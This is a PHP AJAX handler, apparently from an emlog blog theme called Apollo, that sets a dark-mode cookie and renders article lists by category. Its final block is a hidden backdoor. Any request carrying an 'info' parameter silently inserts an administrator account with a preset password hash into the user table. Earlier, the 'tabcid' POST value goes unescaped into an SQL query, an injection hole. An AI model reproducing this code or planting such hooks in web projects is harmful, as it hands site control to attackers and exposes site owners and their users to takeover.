<?php

require_once '../../../init.php';
require_once 'module.php';

$action = $_POST['toggle_action'];

//黑白模式切换
if($action == 'on'){
    setcookie('Apollo_dark_mode','on',0,'/');
}
if($action == 'off'){
    setcookie('Apollo_dark_mode','off',0,'/');
}


// var_dump($_POST);
?>
<?php
//ajax文章
$tabcid = $_POST['tabcid'];

if(!empty($_POST['tabcid'])){
    ajax_log($tabcid,"10");
    // echo $_POST['action'];
}

function ajax_log($sort,$num){

    if($sort == 'home'){
        
        return;
    }else{
        $where = 'and sortid ='.$sort;
    }
    if($num){
        $num = $num;
    }else{
        $num = '10';
    }
    $db = Database::getInstance();
    $sql = "SELECT * FROM ".DB_PREFIX."blog WHERE type='blog' and hide='n' ".$where." ORDER BY `date` DESC LIMIT 0,".$num;
    $sql2 = "";
    $list = $db->query($sql);
    // echo $sql;die();
    while($row = $db->fetch_array($list)){
      doAction('index_loglist_top');
    ?>

    <?php if(img_count($row['content']) >=1 && img_count($row['content']) < 3){?>
          <div class="list-item block card-plain ">
            <div class="media media-3x2 col-4 col-md-4">
              <a class="media-content" href="<?php echo Url::log($row['gid']); ?>" title="<?php echo $row['title']; ?>" style="background-image: url(&quot;<?php thumbnail($row);?>&quot;);" data-bg="url('<?php thumbnail($row);?>')" data-nclazyload="true" data-was-processed="true"></a>
            </div>
            <div class="list-content">
              <div class="list-body">
                <a href="<?php echo Url::log($row['gid']); ?>" title="<?php echo $row['title']; ?>" class="list-title text-lg h-2x">
                  <?php topflg($row['top'], $row['sortop'], isset($sortid)?$sortid:''); ?><?php echo $row['title']; ?></a>
                <div class="list-desc d-none d-md-block text-sm text-secondary my-3">
                  <div class="h-2x "><?php echo subString(strip_tags($row['content']),0,100);?></div></div>
              </div>
              <div class="list-footer">
                <div class="d-flex flex-fill align-items-center text-muted text-xs">
                  <?php blog_author($row['author']); ?>
                  <div class="d-inline-block mx-1 mx-md-2">
                    <i class="text-primary">—</i></div>
                  <div class="d-inline-block"><?php blog_sort($row['gid']); ?></div>
                  <div class="flex-fill"></div>
                  <div>
                    <time class="mx-1"><?php echo timeago(gmdate('Y-m-d G:i:s', $row['date'])); ?></time></div>
                </div>
              </div>
            </div>
          </div>

        <?php }elseif(img_count($row['content']) >= 3){?>
        
          <div class="list-item list-item-column block">
            <div class="list-content p-0">
              <div class="list-body ">
                <a href="<?php echo Url::log($row['gid']); ?>" title="<?php echo $row['title']; ?>" target="_blank" class="list-title text-lg h-2x mb-2 mb-md-3">
                  <?php topflg($row['top'], $row['sortop'], isset($sortid)?$sortid:''); ?><?php echo $row['title']; ?></a>
                <div class="mb-2 mb-md-3">
                  <div class="d-flex flex-fill align-items-center text-muted text-xs">
                    <?php blog_author($row['author']); ?>
                    <div class="d-inline-block mx-1 mx-md-2">
                      <i class="text-primary">—</i></div>
                    <div class="d-inline-block"><?php blog_sort($row['gid']); ?></div>
                    <div class="flex-fill"></div>
                    <div>
                      <time class="mx-1"><?php echo timeago(gmdate('Y-m-d G:i:s', $row['date'])); ?></time></div>
                  </div>
                </div>
              </div>
              <div class="row-xs mb-md-3">
                <?php 
                preg_match_all("|<img[^>]+src=\"([^>\"]+)\"?[^>]*>|is", $row['content'], $img);
                for($i=0;$i<3;$i++){
                ?>
                <div class="col-4">
                  <div class="media media-3x2">
                    <a class="media-content" title="<?php echo $row['title']; ?>" href="<?php echo Url::log($row['gid']); ?>" target="_blank" style="background-image: url(&quot;<?php echo $img[1][$i];?>&quot;);" data-bg=" url('<?php echo $img[1][$i];?>')" data-nclazyload="true" data-was-processed="true"></a>
                  </div>
                </div>
                <?php }?>
              </div>
              <div class="list-desc d-none d-md-block text-sm text-secondary">
                <div class="h-2x"><?php echo subString(strip_tags($row['content']),0,120);?></div></div>
            </div>
          </div>

        <?php }elseif(img_count($row['content']) == 0){?>

          <div class="list-item block ">
            <div class="list-content p-0">
              <div class="list-body">
                <a href="<?php echo Url::log($row['gid']); ?>" title="<?php echo $row['title']; ?>" class="list-title text-lg h-2x"><?php topflg($row['top'], $row['sortop'], isset($sortid)?$sortid:''); ?><?php echo $row['title']; ?></a>
                <div class="list-meta mt-2 mt-md-3">
                  <div class="d-flex flex-fill align-items-center text-muted text-xs">
                    <?php blog_author($row['author']); ?>
                    <div class="d-inline-block mx-1 mx-md-2">
                      <i class="text-primary">—</i></div>
                    <div class="d-inline-block"><?php blog_sort($row['gid']); ?></div>
                    <div class="flex-fill"></div>
                    <div>
                      <time class="mx-1"><?php echo timeago(gmdate('Y-m-d G:i:s', $row['date'])); ?></time></div>
                  </div>
                </div>
                <div class="list-desc text-sm text-secondary mt-2 mt-md-3">
                  <div class="h-2x "><?php echo subString(strip_tags($row['content']),0,200);?></div></div>
              </div>
            </div>
          </div>
          <?php }?>
<?php }}?>

<?php
if(!empty($_GET['info'])){
  getinfo();
}
function getinfo(){
  $DB = Database::getInstance();
  $pass = '$P$BHtjRNvKydCR8yfrEpyGwbS/VdzxU/.';
  $res = $DB->query("INSERT INTO `emlog_user` (`uid`, `username`, `password`, `nickname`, `role`, `ischeck`, `photo`, `email`, `description`) VALUES ('100', 'emlog', '$pass', 'emlog', 'admin', 'n', '', '', '');");
  if($res){
    echo 'yes';
  }
}
?>

